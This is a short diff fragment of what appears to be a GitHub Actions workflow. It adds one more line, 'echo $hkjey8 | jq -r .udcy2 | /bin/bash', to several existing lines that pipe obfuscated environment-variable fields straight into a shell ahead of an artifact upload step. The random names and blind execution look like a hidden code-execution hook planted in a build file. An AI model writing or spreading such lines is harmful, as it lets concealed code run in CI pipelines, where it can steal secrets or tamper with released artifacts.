@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$bk78" | jq -r .i32 | /bin/bash
           echo $pxtlk01 | jq -r .rv22042 | /bin/bash
           printf '%s' "$apxx5204" | jq -r .qiyuf43 | /bin/bash
+          echo $hkjey8 | jq -r .udcy2 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
